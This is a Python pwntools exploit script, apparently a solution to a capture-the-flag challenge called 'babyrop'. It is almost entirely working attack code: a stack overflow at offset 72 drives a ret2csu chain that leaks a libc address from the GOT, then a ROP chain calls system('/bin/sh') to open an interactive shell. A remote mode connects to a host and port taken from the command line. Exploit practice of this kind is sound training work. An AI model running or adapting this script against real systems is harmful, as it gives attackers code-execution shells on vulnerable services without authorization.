#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'babyrop')
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+53
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global libc
    global io

    io = start()

def ret2csu():
    offset = 72
    rbx = 0x0
    rbp = 0x1
    r12 = 0x1
    r13 = exe.got['gets']
    r14 = 0x8
    r15 = exe.got['write']
    junk = b'A'*8


    csu_call = 0x4011b0
    csu_pop = 0x4011ca
    
    payload = flat({
        offset: [
            csu_pop,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            r15,
            csu_call,
            junk,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            r15,
            exe.sym['main']

        ]
    })

    info("Sending Ret2csu Payload")
    sleep(1)
    io.sendline(payload)
    io.recvuntil("name:")
    leak = unpack(io.recv(7)[1:].ljust(8, b'\x00'))
    libc.address = leak - libc.sym['_IO_gets']
    info("Leaked libc address: %#x", leak)
    sleep(1)
    info("Libc base address: %#x", libc.address)
    sleep(1)

def rop():
    offset = 72
    pop_rdi = 0x00000000004011d3 # pop rdi; ret;
    ret = 0x000000000040101a # ret; 

    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    info("Spawning Shell :)")
    sleep(2)
    io.sendline(payload)
    io.recvuntil("name:")
    
    io.interactive()


def main():
    
    init()
    ret2csu()
    rop()
    

if __name__ == '__main__':
    main()

